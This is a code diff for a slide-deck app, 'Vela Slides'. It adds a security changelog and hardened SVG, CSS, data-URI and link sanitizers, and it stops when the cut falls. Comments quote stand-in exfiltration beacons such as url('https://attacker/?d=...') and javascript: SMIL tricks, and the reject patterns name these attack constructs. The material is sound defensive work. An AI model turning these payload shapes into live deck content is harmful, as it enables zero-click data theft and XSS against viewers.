@@ -70,8 +70,34 @@ const velaClipboardReadSlide = async () => {
   return null;
 };
 
-const VELA_VERSION = "12.43";
+const VELA_VERSION = "12.69";
 const VELA_CHANGELOG = [
+  { v: "12.69", d: "Local/desktop mode: fix deck-switch data loss. The browser→file sync-out now cancels any pending stale-deck timer before a switch and refuses to write an empty deck; the file→browser path resets selection when the deck actually changes so the newly-opened deck displays instead of the previous one. LOCAL_MODE skips localStorage load/save entirely (the file on disk is authoritative). Presentation mode starts fullscreen and suppresses the in-app test runners. Pairs with the Neutralino shell's deck-io switching guard and the desktop binary's Windows metadata (\"Vela Slides\")." },
+  { v: "12.68", d: "Security (defense-in-depth, audit follow-up to v12.66/v12.67): close two residual CSS auto-load paths the value-filter hardening did not cover — the slide background image (inline data:image validation now anchors on the full encoded payload, so no trailing content can ride along on an otherwise-valid value) and a block-level color field rendered from a secondary array the import scrub did not visit. Deck values placed into an inline CSS url()/color position are now also output-encoded so they cannot break out of that position. Exposure was limited to non-sandboxed runtimes; the hosted-artifact / local-server CSP already blocked it. Decks still load nothing external. Added regression coverage." },
+  { v: "12.67", d: "Security (audit 2026-06, follow-up to v12.61/v12.66): extend the canonical slide/branding sanitization to the in-app paths that mutate content after load, so the CSS auto-load class stays closed regardless of how content reaches the render layer (deck import was already covered). Exposure was limited to the non-sandboxed runtimes; the hosted artifact CSP already blocked it. No behavior change for legitimate decks; decks still load nothing external. Added regression guards." },
+  { v: "12.66", d: "Security (audit 2026-06, follow-up to v12.59/12.61): close a residual CSS auto-load exfil channel. Under a specific value construction, a deck-supplied value could slip past the inline-style/color-scalar and SVG style value filters and fire a zero-click outbound request on render. Exposure was limited to the non-sandboxed runtimes (local dev server / desktop shell); the hosted artifact's CSP already blocked it. Both value filters were hardened and now share one rule so the two surfaces can't drift. Decks still load nothing external. Added regression coverage through the real sanitizers plus a real-browser render check." },
+  { v: "12.65", d: "Security (defense-in-depth, audit follow-up): the local dev server (serve.py) live-reload watcher now re-validates folder containment every time it re-reads a deck, using the same realpath guard as the HTTP read/write paths instead of a bare open(). This makes every server-side file read consistent and keeps reloads scoped to the served folder. Local-server hardening only; no deck or engine behavior change. Added a regression test." },
+  { v: "12.64", d: "Security (defense-in-depth, audit follow-up): inline data: images (image-block src, slide background image, branding logo) are now sanitized consistently — raster types pass through, SVG data: images are routed through the same SVG sanitizer the svg block uses, and non-image data: types are dropped (the logo no longer accepts arbitrary data: MIME types). Deck-supplied prompt-guidelines text is stripped of control/bidi/format characters before it reaches the engine. Local server (serve.py) deck-name validation normalizes Unicode and rejects bidi/format controls and separator/dot lookalikes (anti-spoofing; the path containment check was already in place). Added regression coverage." },
+  { v: "12.63", d: "Security (defense-in-depth): the local dev server (serve.py) now sends a Content-Security-Policy header. The hosted artifact runs sandboxed with its own CSP; the local server had none, leaving the client sanitizer as the only egress control. The policy constrains image and connection egress to same-origin and inline data (no external network requests on render) while still permitting the in-browser build toolchain. No deck or engine behavior change." },
+  { v: "12.62", d: "Security (audit 2026-06, follow-up to v12.59/12.61): close a residual zero-click outbound-fetch channel in the SVG sanitizer. Deck-supplied SVG markup is sanitized as SVG but later rendered into an HTML context, where a sanitized fragment could be re-parsed under HTML rules and an image element treated as an HTML image with a fetching attribute — a different surface from the href/CSS holes already closed. The sanitizer now strips the relevant image-source attributes and guarantees the output stays in SVG scope, so the same content can never be reinterpreted as a network-loading HTML element. Decks still load nothing external. Added a jsdom round-trip regression battery and a CI source guard." },
+  { v: "12.61", d: "Security (audit 2026-06, follow-up to v12.59): close a CSS auto-load exfil channel on the slide/block color surface. Slide and block background/color scalars (e.g. bg, bgGradient, color, accent, border, the per-block color fields, and grid cell backgrounds) were written straight into inline CSS at render without the value filter that already covered the block style object, so a deck-supplied value could fire a zero-click outbound request on render — same class as the SVG/img holes, different surface. These fields are now scrubbed at import with a function-name-agnostic reject (no url()/quoted-source function/bare scheme), preserving legitimate colors and gradients; the undocumented slide background-image field is clamped to inline data:image/* like the image block. Decks still load nothing external. Added jsdom round-trip + CI source guards and in-browser regression cases." },
+  { v: "12.60", d: "Security (defense-in-depth, follow-up to v12.53): harden the SVG/CSS sanitizer so deck-supplied content cannot trigger any external network request on render. URL references are constrained to same-document fragments, links to standard click navigation, and inline images to embedded data; legitimate same-document refs and links are preserved. Added CI regression coverage asserting no external reference survives sanitization." },
+  { v: "12.59", d: "serve.py: tighten request validation on the local live-edit save endpoint — match the full request origin (scheme/host/port) and require a JSON content type. Local-server hardening only; no deck or engine behavior change." },
+  { v: "12.58", d: "PDF export: (1) Fix dark boxes behind module title-card badge/icon in the vector exporter — the title card's `bg` is a gradient string, so the composite-bg detector (which only matched rgba()/^#hex$) fell back to dark #0a0f1c and translucent badge/icon fills (#RRGGBBAA) alpha-blended to navy. Now derives the alpha-blend base from the gradient's first hex stop. (2) New 'Module title cards' toggle in the export dialog with a live count of enabled 🎬 present-cards; off filters the _virtual cards out of the exported PDF (raster + vector). Default on." },
+  { v: "12.57", d: "PDF export now includes auto-generated module title cards (the 🎬 \"present card\") so exports match presentation mode exactly. Extracted buildTitleCardSlide() as the single source of truth shared by SlidePanel (presentation) and collectAllSlides (PDF/markdown). Title cards are inserted before each enabled module's slides and rendered without branding overlays; slide numbering excludes the cards (displayIndex/displayTotal) so real slides keep continuous 1-based numbers, matching the on-screen presentation." },
+  { v: "12.56", d: "Release: version bump to publish desktop binaries with the merged security hardening (assemble.py script-context escape, SVG mutation-XSS fixes, deck-JSON sanitizer + fail-closed loads, and the Neutralino desktop blast-radius containment — strict CSP, minimal nativeAllowList with no os.spawnProcess, filesystem path guard, externally-authored-deck warning, and update notifier). No engine behavior change in this bump itself." },
+  { v: "12.55", d: "Security (Critical, audit 2026-06): fix an output-encoding gap in assemble.py where deck content embedded into the assembled app at the STARTUP_PATCH marker was not fully escaped for its surrounding context, letting crafted deck text break out of that context on render. Centralized the encoding in a single shared escape_for_script_context() helper (also imported by serve.py) covering the full required character set, replacing a narrower prior filter in both call sites. CI regression test asserts the assembled output is correctly encoded." },
+  { v: "12.54", d: "Security (audit 2026-06, High + structural): close a mutation-XSS hole in sanitizeSvgMarkup() involving certain child node types inside <style>, and switch SVG element filtering from a blocklist to an allowlist (mirroring DOMPurify's svg + svgFilters profile) so anything not explicitly known-safe is removed. Added a CI-gated jsdom round-trip test that runs the real sanitizer against a payload battery, replacing source-string-only checks." },
+  { v: "12.53", d: "Security (audit 2026-06, Low/defense-in-depth): close a CSS-text exfil channel inside SVG, where <style> CSS could reference an external resource and fire an outbound request on render. <link> is now removed outright and <style> text is filtered to allow only same-document references, preserving legitimate class-based diagram styling while removing the exfil." },
+  { v: "12.52", d: "Security (audit 2025-06 follow-up): pin every GitHub Actions reference to a commit SHA across all workflows (mutable tag pins are a supply-chain risk in the privileged release pipeline), guarded by a CI regression test. Bump the channel @modelcontextprotocol/sdk dependency to clear known transitive advisories." },
+  { v: "12.51", d: "Security (defense-in-depth, follow-up to v12.44/12.45): tighten SVG href validation from a blocklist to a scheme allowlist after DOMParser normalization, so only standard link schemes (plus same-document fragments and relative refs) survive; xlink:href stays fragment-only. Mixed-case and entity-encoded schemes have explicit regression tests, with a guard so legitimate links aren't stripped." },
+  { v: "12.50", d: "Security (audit 2025-05 — Critical/High hardening): (H1) the LOAD_LANES reducer now re-sanitizes every slide, closing the one ingest path (Vera's tool writes) that previously skipped sanitization. (H2) new sanitizeStyle() + SAFE_STYLE_KEYS allowlist for block/item style objects, which were previously typecheck-only — excludes resource-loading CSS keys and rejects external/url-bearing values. (H5) the ReAct loop caps per-turn and session tool counts and payload size to prevent prompt-injection cost-amplification." },
+  { v: "12.49", d: "Tests: complete XSS/deck-load regression coverage — added CI-gating source assertions and new in-browser uitest cases across the SVG sanitizer and deck-sanitization paths." },
+  { v: "12.48", d: "Security (defense-in-depth): block the full SMIL animation family in the SVG sanitizer. Their event handlers were already stripped (inert), but removing the elements outright eliminates any residual animation surface. Static presentation diagrams don't use SMIL." },
+  { v: "12.47", d: "Security (High): fix a fail-open path in deck sanitization where an oversized-deck error was caught by callers that then loaded the unsanitized deck. The size limit is now clamped instead of thrown, and all fallbacks fail closed (log and skip). Also routes an additional chat-paste import path through full sanitization." },
+  { v: "12.46", d: "Security (Medium/defense-in-depth): close link-sanitization gaps so all deck-supplied link fields are URL-sanitized at import and again at the click sink via a shared helper, including the study-notes glossary link. Brings item-level links in line with block-level and bullet links." },
+  { v: "12.45", d: "Security (High): sanitizeSvgMarkup() now drops comment/CDATA/processing-instruction nodes during the DOM walk, keeping only element and text nodes. These node types could otherwise survive a sanitize/re-parse round-trip and yield mutation XSS across all three SVG sinks (svg block, study-notes diagram, chat diagram). Confirmed via jsdom round-trip." },
+  { v: "12.44", d: "Security (High): svg block markup now goes through the DOM-based sanitizeSvgMarkup() at both import and render, replacing a bypassable regex chain that let obfuscated URIs survive. DOMParser parsing plus scheme normalization brings the svg block in line with the study-notes/chat diagram paths." },
   { v: "12.43", d: "Desktop release builds ship with the web inspector disabled by default. neutralino.config.json sets enableInspector:false (release-safe); dev sessions re-enable DevTools via the runtime override `--window-enable-inspector=true` passed by scripts/run.sh, so no config mutation or git churn during development." },
   { v: "12.42", d: "Single-file desktop binaries: build now uses `neu build --release --embed-resources`, so resources.neu is injected into each per-OS executable via postject. ZIPs contain just the binary — no companion file required, no \"keep next to each other\" caveat. Requires neu CLI ≥ 11.6 and Neutralino framework ≥ 6.3 (both already pinned)." },
   { v: "12.41", d: "Release pipeline: desktop binaries now ship on every push to main alongside the skill ZIP (previously preview-only). Neutralino runtime + client lib are pinned by SHA256 (verified after `neu update` so an upstream re-roll fails the build). Stable and PR-preview releases share a reusable workflow, and every release ZIP gets a SHA256SUMS manifest plus a SLSA build-provenance attestation." },
@@ -234,8 +260,10 @@ function applyStartupPatch(loadedDeck, dispatch) {
       const sanitized = validateAndSanitizeDeck(STARTUP_PATCH);
       dispatch({ type: "LOAD", payload: { ...sanitized, deckTitle: STARTUP_PATCH.deckTitle || "Untitled" } });
     } catch (e) {
-      dbg("[PATCH] Sanitize failed, loading raw:", e);
-      dispatch({ type: "LOAD", payload: STARTUP_PATCH });
+      // Fail closed: never load an unsanitized deck. validateAndSanitizeDeck only throws
+      // on fundamentally invalid input (not an object / no lanes array) now that the
+      // lane-count limit is clamped rather than thrown.
+      dbg("[PATCH] Sanitize failed, skipping patch (not loading raw):", e);
     }
     return;
   }
@@ -331,7 +359,101 @@ function sanitizeUrl(url, allowedProtocols = ["http:", "https:", "mailto:"]) {
   } catch (_) { return ""; }
 }
 
-const SVG_BLOCKED_TAGS = new Set(["script", "foreignobject", "iframe", "embed", "object", "use", "animate", "set", "handler", "listener"]);
+// Open a deck-supplied URL safely — re-sanitize at the sink so a javascript:/data:/
+// vbscript: link can never reach window.open even if a mutation path skipped import
+// sanitization or a future runtime (e.g. desktop webview) allows those schemes.
+function openExternalLink(url) {
+  const safe = sanitizeUrl(url);
+  if (safe) window.open(safe, "_blank", "noopener,noreferrer");
+}
+
+// SECURITY (v12.54): allowlist, not blocklist. Mirrors DOMPurify's SVG profile
+// (src/tags.ts `svg` + `svgFilters`) with Vela-specific exclusions for our
+// threat model (static presentation diagrams, no animation, no cross-doc
+// references). Anything not in this set — including the entire HTML rawtext
+// family (xmp/noembed/noscript/noframes/plaintext/listing) and any future
+// surprise tag — is removed during the walk. Excluded by design (commented
+// alongside each group): script/iframe/embed/object/link (XSS sinks),
+// foreignObject (re-enters HTML namespace, full HTML XSS surface), use (cross-
+// doc reference XSS — Cure53 #283 class), animate/animateColor/animateMotion/
+// animateTransform/set/mpath/discard/cursor (SMIL attr-mutation: `<animate
+// attributeName=href values=javascript:...>`), handler/listener (legacy
+// scripting hooks), font-face (FOUC + URL loaders).
+const SVG_ALLOWED_TAGS = new Set([
+  // structural
+  "svg", "g", "defs", "symbol", "switch", "view", "desc", "title", "metadata",
+  "marker", "mask", "clippath", "pattern", "filter",
+  // shapes
+  "circle", "ellipse", "line", "path", "polygon", "polyline", "rect",
+  // text/font (font/glyph/hkern/vkern + tref are deprecated but legitimate; no XSS surface)
+  "text", "tspan", "textpath", "tref", "altglyph", "altglyphdef", "altglyphitem",
+  "glyph", "glyphref", "font", "hkern", "vkern",
+  // gradients / paints
+  "lineargradient", "radialgradient", "stop",
+  // filter primitives (the `fe*` family — purely declarative pixel ops)
+  "feblend", "fecolormatrix", "fecomponenttransfer", "fecomposite",
+  "feconvolvematrix", "fediffuselighting", "fedisplacementmap", "fedistantlight",
+  "fedropshadow", "feflood", "fefunca", "fefuncb", "fefuncg", "fefuncr",
+  "fegaussianblur", "feimage", "femerge", "femergenode", "femorphology",
+  "feoffset", "fepointlight", "fespecularlighting", "fespotlight", "fetile",
+  "feturbulence",
+  // common-but-needs-care (each has explicit attribute filtering downstream)
+  "a",      // href passes scheme allowlist
+  "image",  // href/xlink:href pass scheme allowlist
+  "style",  // textContent passes isSvgStyleSafe; walk descends to strip CDATA/comment/PI
+]);
+
+// SVG attributes whose value can carry a functional URL reference that the
+// browser fetches automatically on render (zero-click). style="…" holds CSS;
+// the rest are paint/filter/mask/marker/clip-path/cursor presentation
+// attributes that accept url(…) / image-set(…) / etc. Each value is run through
+// isSvgStyleSafe() so only same-document url(#fragment) survives — no external
+// url(), no image-set()/image()/cross-fade()/src() string sources. (v12.59)
+const SVG_URL_REF_ATTRS = new Set([
+  "style", "fill", "stroke", "filter", "mask", "clip-path",
+  "marker", "marker-start", "marker-mid", "marker-end", "cursor", "color-profile",
+]);
+
+// SVG <style> CSS-text filter. The threat: <style>* { background: url("https://
+// attacker/?d=...") }</style> or @import url(...) fires an outbound GET on
+// render — zero-click exfil beacon with no CSP backstop inside the artifact
+// srcdoc. SAFE_STYLE_KEYS only filters the style="..." inline attribute, not
+// <style>-element CSS text. We allow url(#fragment) (SVG paint servers,
+// markers, gradients, clip-paths) and reject everything else that can hit
+// the network or use legacy code-execution constructs. CSS \XX escape
+// sequences can decode "url" / "@import" past a literal-token regex
+// (e.g. \75rl(…) → url(…)), so we conservatively reject any backslash.
+// Also reject any '<' or ']]>' — defense-in-depth against rawtext-breakout
+// payloads slipped through child node types (CDATA/comment/PI), see v12.52.
+function isSvgStyleSafe(css) {
+  if (typeof css !== "string" || css.length > 5000) return false;
+  if (css.indexOf("\\") !== -1) return false;
+  if (css.indexOf("<") !== -1) return false;
+  if (css.indexOf("]]>") !== -1) return false;
+  // Reject any CSS comment. CSS permits a comment (not just whitespace) as a token
+  // separator between a function name and its '('/quoted argument; the fnStr/url()
+  // checks below assume only whitespace, so a comment could split the token and let
+  // a string-source URL through — a zero-click exfil beacon on render. Legit Vela
+  // paint CSS never needs comments; reject outright, mirroring the backslash reject
+  // above. (Pairs with the same reject in STYLE_VALUE_REJECT.)
+  if (css.indexOf("/*") !== -1) return false;
+  if (/@import|expression\s*\(|behavior\s*:|-moz-binding/i.test(css)) return false;
+  const urls = css.match(/url\s*\([^)]*\)/gi);
+  if (urls && urls.some((u) => !/^url\s*\(\s*['"]?\s*#/i.test(u))) return false;
+  // v12.59: reject any non-url() CSS function fed a string literal. image-set()/
+  // image()/cross-fade()/src() (and any future image-ish function) take a bare
+  // "https://…" string with NO url() token, so the url() check above misses them
+  // — a zero-click outbound GET (CSS-exfil beacon) on render. This shape
+  // (function-name + quote) is only ever a URL-by-string in CSS values:
+  // rgb()/calc()/var()/translate() never take strings, and font-family:"X" is a
+  // bare value, not a call. url(…) is the sole legitimate string-taking function
+  // and is already validated to be a #fragment above. Function-name-agnostic, so
+  // functions that don't exist yet cannot reopen this. Closes the residual
+  // image-set() bypass of the v12.53 url() exfil fix.
+  const fnStr = css.match(/[a-z][\w-]*\s*\(\s*['"]/gi);
+  if (fnStr && fnStr.some((m) => !/^url\s*\(/i.test(m))) return false;
+  return true;
+}
 
 function sanitizeSvgMarkup(raw) {
   if (typeof raw !== "string") return "";
@@ -342,17 +464,68 @@ function sanitizeSvgMarkup(raw) {
     const walk = (node) => {
       const children = Array.from(node.childNodes);
       for (const child of children) {
+        // Keep only element (1) and text (3) nodes. Drop comment (8), CDATA (4) and
+        // processing-instruction (7) nodes: they serialize literally (unescaped), so a
+        // smuggled </style></title></text> inside CDATA breaks out of rawtext when the
+        // serialized string is re-parsed as HTML by dangerouslySetInnerHTML (mutation XSS).
+        if (child.nodeType !== 1 && child.nodeType !== 3) { child.remove(); continue; }
         if (child.nodeType === 1) {
           const tag = child.localName.toLowerCase();
-          if (SVG_BLOCKED_TAGS.has(tag)) { child.remove(); continue; }
+          // SECURITY (v12.54): allowlist — anything not explicitly known-safe is removed.
+          // Replaces the previous SVG_BLOCKED_TAGS blocklist (inherently incomplete).
+          if (!SVG_ALLOWED_TAGS.has(tag)) { child.remove(); continue; }
+          if (tag === "style") {
+            if (!isSvgStyleSafe(child.textContent || "")) { child.remove(); continue; }
+            // CSS text is safe — skip attribute walk (no on*/href/etc. on <style>).
+            // SECURITY (v12.52): we MUST still descend so the nodeType filter above
+            // strips any CDATA/comment/PI children. CDATA serializes literally and
+            // a smuggled `</style>` inside it escapes rawtext when re-parsed as HTML
+            // by dangerouslySetInnerHTML, yielding a live <img onerror=...>.
+            walk(child);
+            continue;
+          }
           const attrs = Array.from(child.attributes);
           for (const a of attrs) {
             const name = a.name.toLowerCase();
             if (name.startsWith("on")) { child.removeAttribute(a.name); continue; }
+            // src/srcset never appear on legitimate SVG elements (SVG uses href/
+            // xlink:href), so they survive the SVG parse inert — but the sanitized
+            // string is later parsed in an HTML context (dangerouslySetInnerHTML into a
+            // <div>), where <image> is the HTML alias for <img> and src/srcset become a
+            // zero-click external fetch on render. Strip them outright. (v12.62)
+            if (name === "src" || name === "srcset") { child.removeAttribute(a.name); continue; }
+            // SECURITY: href/xlink:href are ALLOWLIST after DOMParser normalization.
+            // Entities (&#x3a;, &#58;, &#115;) are already decoded by the parser; we strip
+            // ASCII control/whitespace (browsers ignore them inside a scheme — "java\tscript:"
+            // is "javascript:"), then check via fixed allowlists. Mixed-case is folded by
+            // toLowerCase(). Blocklist alone would let file:, blob:, chrome:, intent:, etc.
+            if (name === "href" || name === "xlink:href") {
+              const norm = a.value.replace(/[\u0000-\u0020]+/g, "");
+              const lower = norm.toLowerCase();
+              // <a href> = BUCKET B (click nav): http/https/mailto/tel only.
+              // Every OTHER href/xlink:href (image/feImage/use/tref/altGlyph/…) =
+              // BUCKET A (auto-fetched on render): same-document #fragment ONLY — no
+              // external, no data:, no blob:. Vela decks load nothing external. Closes
+              // <feImage href> (Roundcube-class) + external <image href> zero-click
+              // beacons the old http/https allowance left open on non-anchors. (v12.59)
+              if (name === "href" && tag === "a") {
+                const m = norm.match(/^([a-z][a-z0-9+\-.]*):/i);
+                if (m && !["http", "https", "mailto", "tel"].includes(m[1].toLowerCase())) { child.removeAttribute(a.name); continue; }
+              } else if (!lower.startsWith("#")) {
+                child.removeAttribute(a.name); continue;
+              }
+            }
             const val = a.value.trim().toLowerCase();
-            if ((name === "href" || name === "xlink:href") && (val.startsWith("javascript:") || val.startsWith("data:") || val.startsWith("vbscript:"))) { child.removeAttribute(a.name); continue; }
+            // Scheme check ignores ASCII whitespace/control chars (browsers strip tab/newline/CR inside URL schemes — "java\tscript:" === "javascript:")
+            const scheme = a.value.replace(/[\u0000-\u0020]+/g, "").toLowerCase();
+            if ((name === "href" || name === "xlink:href") && (scheme.startsWith("javascript:") || scheme.startsWith("data:") || scheme.startsWith("vbscript:"))) { child.removeAttribute(a.name); continue; }
             if (name === "xlink:href" && !val.startsWith("#")) { child.removeAttribute(a.name); continue; }
-            if (name === "style" && (/url\s*\([^)]*(?:javascript|data|vbscript):/i.test(a.value) || /expression\s*\(/i.test(a.value))) { child.removeAttribute(a.name); continue; }
+            // BUCKET A — CSS / presentation references that auto-fetch on render:
+            // style="…" plus paint/filter/mask/marker/clip-path/cursor attributes.
+            // isSvgStyleSafe allows only url(#fragment); rejects external url(),
+            // image-set()/image()/cross-fade()/src() string sources, @import and CSS-
+            // escape obfuscation. Supersedes the prior style-only js/data check. (v12.59)
+            if (SVG_URL_REF_ATTRS.has(name) && !isSvgStyleSafe(a.value)) { child.removeAttribute(a.name); continue; }
           }
           walk(child);
         }
@@ -360,8 +533,144 @@ function sanitizeSvgMarkup(raw) {
     };
     const root = doc.documentElement;
     walk(root);
-    return root.innerHTML;
+    // The sanitized markup is injected via dangerouslySetInnerHTML into an HTML
+    // <div>. If the returned string is not SVG-scoped at the top level, the HTML
+    // parser runs in HTML insertion mode, where <image> is the spec alias for <img>
+    // (and other SVG tags can HTML-alias) — turning deck-supplied content into a
+    // zero-click outbound fetch even after attribute filtering. A deck that supplied
+    // its own single <svg> root is returned verbatim (renders unchanged); anything
+    // else keeps our <svg> wrapper so the sink always parses it in SVG foreign-content
+    // scope, neutralizing HTML-aliasing for the whole tag class. (v12.62)
+    if (!root.innerHTML.trim()) return "";
+    const top = Array.from(root.children);
+    if (top.length === 1 && (top[0].localName || "").toLowerCase() === "svg") {
+      return top[0].outerHTML;
+    }
+    return root.outerHTML;
   } catch (_) { return ""; }
+}
+
+// Inline data: images for image-block src / slide bgImage / branding logo.
+// Raster types are inert in an <img>. data:image/svg+xml is LIVE SVG — the same
+// markup the dedicated svg block routes through sanitizeSvgMarkup — so it gets
+// the identical decode -> sanitize -> re-encode treatment here rather than
+// relying on the browser's <img> SVG sandbox (the only thing that stops a deck
+// SVG's external <image>/<style url()> from firing in a non-sandboxed context
+// such as the local dev server / a desktop webview). Non-image data: types are
+// dropped (a stricter, consistent allowlist than the prior data:-only logo rule).
+// Raster branch is END-ANCHORED to a pure base64 payload: a prefix-only test let
+// arbitrary trailing bytes ride along on the value, which then broke out of an
+// unquoted CSS url() at a background sink. Anchoring to `;base64,<base64>$` means
+// nothing can follow the image data, so the validated string is safe to return
+// as-is. (The bare `data:image/<t>,<raw>` form is intentionally no longer accepted
+// here — real decks always use base64; the raw form was the risky path.)
+const SAFE_RASTER_DATA_IMAGE = /^data:image\/(?:png|jpe?g|gif|webp|avif|bmp);base64,[A-Za-z0-9+/]+={0,2}$/i;
+function sanitizeImageDataUri(s) {
+  if (typeof s !== "string" || !s) return "";
+  if (SAFE_RASTER_DATA_IMAGE.test(s)) return s;
+  const m = /^data:image\/svg\+xml([^,]*)?,/i.exec(s);
+  if (!m) return "";
+  const meta = m[1] || "";
+  let markup;
+  try {
+    markup = /;base64/i.test(meta) ? atob(s.slice(m[0].length)) : decodeURIComponent(s.slice(m[0].length));
+  } catch (_) { return ""; }
+  const clean = sanitizeSvgMarkup(markup);
+  if (!clean || !/<svg[\s>]/i.test(clean)) return "";
+  return "data:image/svg+xml," + encodeURIComponent(clean);
+}
+
+// SECURITY (audit 2025-05, H2): block.style was previously typecheck-only,
+// which let a deck (or a Vera prompt-injected tool call) ship CSS values
+// like `backgroundImage: url('https://attacker/?d=...')`. Inline styles
+// fire an outbound GET on every render with no CSP backstop inside the
+// artifact srcdoc — a zero-click data-exfil channel. We now apply both an
+// allowlist of safe CSS keys (text/layout/color, no image-loading) AND a
+// value filter that rejects url() / expression() / any string-source CSS
+// function (image-set()/image()/cross-fade()/src(), name-agnostic) / bare
+// scheme / @import / CSS escapes / angle brackets, even on allowlisted keys.
+// This is the single canonical CSS external-load/breakout value filter — it is
+// reused by scrubColorFields() for the slide/block color scalars, so the two
+// surfaces can never drift apart. (SVG CSS uses isSvgStyleSafe() instead, which
+// is deliberately distinct: it must ALLOW same-document url(#fragment) paint
+// servers, which have no meaning — and so stay rejected — here.)
+const SAFE_STYLE_KEYS = new Set([
+  // text
+  "color", "fontWeight", "fontStyle", "fontSize", "fontFamily",
+  "letterSpacing", "lineHeight", "textAlign", "textTransform",
+  "textDecoration", "whiteSpace", "wordBreak", "overflowWrap",
+  // layout
+  "display", "flexDirection", "alignItems", "justifyContent", "gap",
+  "padding", "paddingTop", "paddingRight", "paddingBottom", "paddingLeft",
+  "margin", "marginTop", "marginRight", "marginBottom", "marginLeft",
+  "width", "height", "minWidth", "minHeight", "maxWidth", "maxHeight",
+  "boxSizing", "flex", "flexGrow", "flexShrink", "flexBasis", "flexWrap",
+  "gridTemplateColumns", "gridTemplateRows", "gridColumn", "gridRow",
+  // box
+  "backgroundColor", "borderRadius",
+  "borderTop", "borderRight", "borderBottom", "borderLeft",
+  "borderColor", "borderStyle", "borderWidth",
+  "boxShadow", "opacity",
+]);
+// Trailing `\/\*` rejects any CSS comment: CSS allows a comment (not just the
+// `\s*` whitespace this regex's fnStr clause assumes) as a token separator between
+// a function name and its '('/quoted argument, which could otherwise split the
+// token and let a string-source URL slip past the function-string and `://` checks
+// — a zero-click exfil beacon on render. Color/gradient/layout values never contain
+// a comment; reject outright (pairs with the same reject in isSvgStyleSafe).
+const STYLE_VALUE_REJECT = /url\s*\(|expression\s*\(|@import|:\/\/|[a-z][\w-]*\s*\(\s*['"]|<|\\|\/\*/i;
+function sanitizeStyle(style) {
+  if (!style || typeof style !== "object" || Array.isArray(style)) return undefined;
+  const out = {};
+  for (const k of Object.keys(style)) {
+    if (!SAFE_STYLE_KEYS.has(k)) continue;
+    const v = style[k];
+    if (typeof v === "number" && Number.isFinite(v)) { out[k] = v; continue; }
+    if (typeof v === "string") {
+      if (v.length > 200) continue;
+      if (STYLE_VALUE_REJECT.test(v)) continue;
+      out[k] = v;
+    }
+  }
+  return out;
+}
+
+// Slide- and block-level color/background scalars (bg, color, accent, border,
+// dotColor, headerBg, trackColor, cell.bg …) are written straight into inline
+// CSS — `background`, `background-image`, `color`, `border`, `fill` — at render
+// (e.g. backgroundImage = `url(${slide.bgImage})`). Unlike block.style they never
+// passed through sanitizeStyle, so a value like `url(https://x)` fired a
+// zero-click outbound GET on render (CSS auto-load exfil beacon — same class as
+// the SVG/img holes closed in v12.59, different surface). Vela decks load NOTHING
+// external: legit values here are colors and gradients, which need no url(), no
+// quoted string-source function (image()/image-set()/cross-fade()/src()), and no
+// bare URL. Reuse the canonical STYLE_VALUE_REJECT (defined above) so this surface
+// and block.style share ONE filter and can't drift apart. bgImage (a background
+// *image*) is clamped to data:image/* separately, like the image block / logo.
+const CSS_COLOR_KEY = /^(bg|color|accent|fill|stroke|border)$|(Color|Bg|Border|Gradient|Fill|Stroke)$/;
+function scrubColorFields(obj) {
+  if (!obj || typeof obj !== "object") return;
+  for (const k of Object.keys(obj)) {
+    const v = obj[k];
+    if (typeof v !== "string" || !CSS_COLOR_KEY.test(k)) continue;
+    if (v.length > 500 || STYLE_VALUE_REJECT.test(v)) delete obj[k];
+  }
+}
+
+// CSS-context output encoders for deck values interpolated into inline CSS at
+// render (a `url(...)` position or a bare color token). The value-level allowlists
+// above decide WHAT is allowed; these ensure a value cannot break out of its CSS
+// context — defense-in-depth so any future/missed value still can't append a second
+// (external) background layer. cssUrl quotes + escapes so the value stays a single
+// url() string; cssColor passes only a strict color token (else empty, caller falls
+// back to a default). Neither permits a bare external URL on its own.
+function cssUrl(u) {
+  return 'url("' + String(u == null ? "" : u).replace(/[\\"]/g, "\\$&").replace(/[\n\r\f]/g, "") + '")';
+}
+const CSS_COLOR_OK = /^#[0-9a-f]{3,8}$|^(?:rgb|rgba|hsl|hsla)\([0-9.,%\s/]+\)$|^[a-z]+$/i;
+function cssColor(c) {
+  const v = String(c == null ? "" : c).trim();
+  return (CSS_COLOR_OK.test(v) && !/url\(|\/\*|[<>]/i.test(v)) ? v : "";
 }
 
 function sanitizeBlock(block) {
@@ -376,7 +685,12 @@ function sanitizeBlock(block) {
   if (clean.value) clean.value = sanitizeString(String(clean.value), 100);
   if (clean.title) clean.title = sanitizeString(clean.title, 500);
   if (clean.link) clean.link = sanitizeUrl(clean.link);
-  if (clean.src && clean.type === "image") clean.src = sanitizeUrl(clean.src, ["http:", "https:", "data:"]);
+  // Image block <img src> auto-fetches on render. Vela decks load nothing
+  // external, so restrict to inline data:image/* (no network, no data:text/html).
+  // Mirrors the branding-logo rule (data:-only). (v12.59)
+  if (clean.src && clean.type === "image") {
+    clean.src = sanitizeImageDataUri(sanitizeUrl(clean.src, ["data:"]));
+  }
   if (Array.isArray(clean.items)) {
     if (clean.type === "bullets") {
       clean.items = clean.items.slice(0, 50).map((it) =>
@@ -389,6 +703,18 @@ function sanitizeBlock(block) {
         blocks: Array.isArray(cell?.blocks) ? cell.blocks.map(sanitizeBlock).filter(Boolean) : [],
       }));
     }
+    if (clean.type === "icon-row") {
+      clean.items = clean.items.slice(0, 20).map((it) => {
+        if (typeof it === "string") return sanitizeString(it, 500);
+        if (!it || typeof it !== "object") return null;
+        const c = { ...it };
+        if (c.text) c.text = sanitizeString(c.text, 500);
+        if (c.label) c.label = sanitizeString(c.label, 200);
+        if (c.value) c.value = sanitizeString(String(c.value), 100);
+        if (c.link) c.link = sanitizeUrl(c.link);
+        return c;
+      }).filter(Boolean);
+    }
     if (clean.type === "flow" || clean.type === "steps" || clean.type === "timeline" || clean.type === "tag-group" || clean.type === "funnel" || clean.type === "cycle" || clean.type === "number-row" || clean.type === "checklist") {
       clean.items = clean.items.slice(0, 20).map((it) => {
         if (!it || typeof it !== "object") return null;
@@ -397,6 +723,7 @@ function sanitizeBlock(block) {
         if (c.title) c.title = sanitizeString(c.title, 500);
         if (c.text) c.text = sanitizeString(c.text, 1000);
         if (c.date) c.date = sanitizeString(c.date, 50);
+        if (c.link) c.link = sanitizeUrl(c.link);
         return c;
       }).filter(Boolean);
     }
@@ -414,7 +741,18 @@ function sanitizeBlock(block) {
         if (!it || typeof it !== "object") return null;
         const c = { ...it };
         if (c.title) c.title = sanitizeString(c.title, 200);
